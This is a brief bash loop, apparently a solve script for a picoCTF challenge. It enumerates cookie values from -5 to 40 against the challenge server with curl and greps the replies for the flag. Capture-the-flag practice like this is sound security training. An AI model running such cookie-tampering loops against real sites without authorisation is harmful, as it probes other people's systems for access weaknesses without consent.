for i in $(seq -5 40)
do
	echo "Case $i : "
	curl -s http://mercury.picoctf.net:29649/ -H "Cookie: name=$i;" -L | grep -i cookie
done
